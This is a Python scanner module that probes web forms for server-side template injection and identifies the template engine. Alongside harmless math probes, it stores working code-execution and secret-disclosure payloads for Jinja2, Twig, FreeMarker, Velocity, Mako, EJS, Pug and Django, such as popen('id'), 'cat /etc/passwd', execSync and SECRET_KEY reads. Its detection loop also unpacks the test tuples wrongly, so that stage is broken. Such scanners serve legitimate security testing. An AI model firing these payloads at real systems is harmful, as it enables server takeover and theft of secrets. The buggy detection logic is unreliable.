#!/usr/bin/env python3
"""
Server-Side Template Injection (SSTI) vulnerability scanner.
Tests for template injection in various template engines.

References:
    - PortSwigger: https://portswigger.net/web-security/server-side-template-injection
    - OWASP: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
    - CWE-94: Improper Control of Generation of Code
"""

import re
import time
from typing import Dict, List, Optional
from urllib.parse import urljoin
from loguru import logger


class Scanner:
    """Server-Side Template Injection vulnerability scanner."""
    
    def __init__(self, browser, target_url: str, config: Dict):
        """
        Initialize SSTI scanner.
        
        Args:
            browser: StealthBrowser instance
            target_url: Target URL to scan
            config: Configuration dictionary
        """
        self.browser = browser
        self.target_url = target_url.rstrip('/')
        self.config = config
        self.findings = []
        self.module_name = "Server-Side Template Injection (SSTI)"
        
        # SSTI detection payloads for different template engines
        self.detection_payloads = [
            # Generic polyglot
            '${{<%[%\'"}}%\\.',
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '#{7*7}',
            '*{7*7}',
        ]
        
        # Template engine identification payloads
        self.engine_payloads = {
            'jinja2': [
                "{{7*7}}",
                "{{config}}",
                "{{self}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                "{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['os'].popen('id').read()}}",
            ],
            'twig': [
                '{{7*7}}',
                '{{_self}}',
                "{{_self.env.registerUndefinedFilterCallback('exec')}}",
                "{{_self.env.getFilter('cat /etc/passwd')}}",
            ],
            'freemarker': [
                '${7*7}',
                '${product("freemarker")}',
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            ],
            'velocity': [
                '#set($x=7*7)$x',
                '${{7*7}}',
                '#set($cmd="id")$x.getClass().forName("java.lang.Runtime").getRuntime().exec($cmd)',
            ],
            'smarty': [
                '{$smarty.version}',
                '{7*7}',
                '{php}echo "id";{/php}',
            ],
            'django': [
                '{{7*7}}',
                '{{settings.SECRET_KEY}}',
                '{% debug %}',
            ],
            'mako': [
                '${7*7}',
                '${self}',
                '<% import os %>${os.popen("id").read()}',
            ],
            'handlebars': [
                '{{7*7}}',
                '{{constructor.constructor("return process.env")()}}',
            ],
            'ejs': [
                '<%= 7*7 %>',
                '<%= process.env %>',
                '<%- global.process.mainModule.require("child_process").execSync("id") %>',
            ],
            'pug': [
                '#{7*7}',
                '#{global.process.mainModule.require("child_process").execSync("id")}',
            ],
        }
        
        # Mathematical operations for detection
        self.math_payloads = {
            'multiply': [
                ('{{7*7}}', '49'),
                ('${7*7}', '49'),
                ('<%= 7*7 %>', '49'),
                ('#{7*7}', '49'),
                ('*{7*7}', '49'),
                ('{7*7}', '49'),
                ('{{7*\'7\'}}', '7777777'),
            ],
        }
        
        # Success indicators
        self.success_indicators = [
            '49',       # Result of 7*7
            '7777777',  # Result of 7*'7'
        ]
    
    def run(self) -> Dict:
        """
        Execute SSTI vulnerability tests.
        
        Returns:
            Dict with findings and test results
        """
        logger.info(f"Starting {self.module_name} scan")
        
        result = {
            'module': self.module_name,
            'parameters_tested': [],
            'vulnerable_parameters': [],
            'detected_engines': [],
            'findings': []
        }
        
        # Find testable parameters
        test_params = self._discover_parameters()
        
        for url, params in test_params:
            for param_name, param_value in params.items():
                result['parameters_tested'].append(f"{url}:{param_name}")
                
                # Test for SSTI
                engine_info = self._test_parameter(url, param_name, params)
                
                if engine_info:
                    result['vulnerable_parameters'].append({
                        'url': url,
                        'parameter': param_name,
                        'engine': engine_info['engine'],
                        'confidence': engine_info['confidence']
                    })
                    
                    if engine_info['engine'] not in result['detected_engines']:
                        result['detected_engines'].append(engine_info['engine'])
        
        # Generate findings
        for vuln in result['vulnerable_parameters']:
            self.findings.append({
                'title': (
                    f"Server-Side Template Injection (SSTI) in '{vuln['parameter']}' "
                    f"parameter - Engine: {vuln['engine']}"
                ),
                'severity': 'critical',
                'description': (
                    f"SSTI vulnerability detected in the '{vuln['parameter']}' parameter "
                    f"at {vuln['url']}. Template engine detected: {vuln['engine']}. "
                    f"Confidence: {vuln['confidence']}. This vulnerability can lead to "
                    f"remote code execution, data exfiltration, and complete server compromise."
                ),
                'recommendation': (
                    "1. Never pass user input directly to template rendering functions\n"
                    "2. Use a sandboxed template environment\n"
                    "3. Sanitize and validate all user inputs before processing\n"
                    "4. Use logic-less templates where possible (e.g., Mustache)\n"
                    "5. Implement strict allowlists for template variables\n"
                    "6. Keep template engines updated to the latest version"
                ),
                'module': self.module_name,
                'cwe_id': 'CWE-94',
                'cvss_score': 9.8,
                'evidence': f"Template engine '{vuln['engine']}' detected with confidence: {vuln['confidence']}",
                'references': [
                    'https://portswigger.net/web-security/server-side-template-injection',
                    'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html',
                ]
            })
        
        result['findings'] = self.findings
        
        logger.info(f"{self.module_name} complete. Found {len(self.findings)} vulnerabilities")
        return result
    
    def _discover_parameters(self) -> List:
        """Discover parameters that might be vulnerable to SSTI."""
        test_urls = []
        
        # Common SSTI-vulnerable parameters
        ssti_params = [
            'template', 'view', 'page', 'name', 'message',
            'email', 'username', 'subject', 'content', 'body',
            'description', 'title', 'comment', 'search', 'q',
            'query', 'input', 'data', 'text', 'value',
        ]
        
        # Test main page and common paths
        paths = ['/', '/search', '/contact', '/profile', '/template', '/view']
        
        for path in paths:
            resp = self.browser.get(path)
            if resp and resp.status_code == 200:
                full_url = urljoin(self.target_url, path)
                
                # Extract form parameters
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(resp.text, 'html.parser')
                
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    form_url = urljoin(self.target_url, action) if action else full_url
                    
                    inputs = {}
                    for input_tag in form.find_all(['input', 'textarea']):
                        name = input_tag.get('name', '')
                        if name and any(p in name.lower() for p in ssti_params):
                            inputs[name] = input_tag.get('value', 'test')
                    
                    if inputs:
                        test_urls.append((form_url, inputs))
        
        return test_urls[:15]
    
    def _test_parameter(self, url: str, param_name: str, params: Dict) -> Optional[Dict]:
        """
        Test a parameter for SSTI vulnerability.
        
        Args:
            url: Target URL
            param_name: Parameter name
            params: All parameters
        
        Returns:
            Dict with engine info or None
        """
        # Stage 1: Detection with mathematical operations
        for operation, (payload, expected) in self.math_payloads['multiply']:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self.browser.get(url, params=test_params)
            if resp and resp.status_code == 200:
                if expected in resp.text and payload not in resp.text:
                    # Possible SSTI - now identify the engine
                    engine = self._identify_engine(url, param_name, params)
                    if engine:
                        return {
                            'engine': engine,
                            'confidence': 'high' if engine != 'unknown' else 'low'
                        }
        
        # Stage 2: Detection with generic polyglot
        for payload in self.detection_payloads[:3]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self.browser.get(url, params=test_params)
            if resp and resp.status_code == 200:
                # Check for error messages that indicate template injection
                error_indicators = [
                    'TemplateSyntaxError',
                    'jinja2.exceptions',
                    'Twig_Error',
                    'FreeMarker template error',
                    'VelocityException',
                    'SmartyException',
                    'TemplateDoesNotExist',
                ]
                
                for indicator in error_indicators:
                    if indicator.lower() in resp.text.lower():
                        # Extract engine name from error
                        if 'jinja2' in indicator.lower():
                            return {'engine': 'jinja2', 'confidence': 'high'}
                        if 'twig' in indicator.lower():
                            return {'engine': 'twig', 'confidence': 'high'}
                        if 'freemarker' in indicator.lower():
                            return {'engine': 'freemarker', 'confidence': 'high'}
                        if 'velocity' in indicator.lower():
                            return {'engine': 'velocity', 'confidence': 'high'}
                        if 'smarty' in indicator.lower():
                            return {'engine': 'smarty', 'confidence': 'high'}
                        return {'engine': 'unknown', 'confidence': 'medium'}
        
        return None
    
    def _identify_engine(self, url: str, param_name: str, params: Dict) -> Optional[str]:
        """
        Identify the template engine being used.
        
        Args:
            url: Target URL
            param_name: Parameter name
            params: All parameters
        
        Returns:
            Engine name or None
        """
        # Test each engine's specific payload
        for engine, payloads in self.engine_payloads.items():
            for payload in payloads[:2]:  # Test first 2 payloads per engine
                test_params = params.copy()
                test_params[param_name] = payload
                
                resp = self.browser.get(url, params=test_params)
                if resp and resp.status_code == 200:
                    # Check engine-specific indicators
                    if engine == 'jinja2' and 'UndefinedError' not in resp.text:
                        if '{{' in payload and '49' in resp.text:
                            return 'jinja2'
                    
                    if engine == 'twig' and '49' in resp.text:
                        return 'twig'
                    
                    if engine == 'freemarker' and '49' in resp.text:
                        return 'freemarker'
                    
                    if engine == 'django' and '49' in resp.text:
                        return 'django'
                    
                    if engine == 'smarty' and '49' in resp.text:
                        return 'smarty'
                    
                    if engine == 'mako' and '49' in resp.text:
                        return 'mako'
        
        # If mathematical operations work but engine unknown
        for payload in self.detection_payloads[:1]:
            test_params = params.copy()
            test_params[param_name] = payload
            
            resp = self.browser.get(url, params=test_params)
            if resp and resp.status_code == 200:
                if '49' in resp.text:
                    return 'unknown'
        
        return None